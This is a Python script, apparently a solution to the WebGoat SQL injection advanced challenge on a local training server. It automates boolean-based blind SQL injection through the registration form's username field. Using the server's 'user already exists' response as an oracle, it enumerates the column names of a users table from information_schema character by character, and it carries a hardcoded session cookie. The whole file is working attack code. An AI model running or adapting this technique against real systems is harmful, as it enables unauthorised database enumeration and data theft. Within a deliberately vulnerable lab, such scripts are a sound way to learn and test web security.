import json
import requests
column_list = []
def get_column_names(partial_name):  
    charset = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','$_']
    found_count = 1
    request_headers = {  
        'Cookie': 'JSESSIONID=qcFstFrpPb1Lujrwjxq6j9J4tjdaS87He0UWJYfN',  
    } 
    sql_injection = 'tom\' and (Select count(COLUMN_NAME) from  information_schema.columns  where table_name like \'SQL_CHALLENGE_USERS\' and column_name like \'{}%\' ESCAPE \'$\')> 0;--'.format(partial_name)
    request_data = {  
        'username_reg': sql_injection,  
        'email_reg': 'kvdr@gmail.com',  
        'password_reg': '000',  
        'confirm_password_reg': '000'  
    }      
    response = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=request_headers, data=request_data)  
    try:  
        response_json = json.loads(response.text) 
    except:
        print("Incorrect JSESSIONID, find it by inspecting your requests once logged in.")  
        return    
    if "already exists please try to register with a different username" in response_json['feedback']:  
        for char in charset:
            found_count += get_column_names(partial_name + char)
        if(found_count == 1):
            partial_name = partial_name.replace('$','')
            column_list.append(partial_name)
            print(column_list)
        return 1
    else:
        return 0
get_column_names('')
print(column_list)
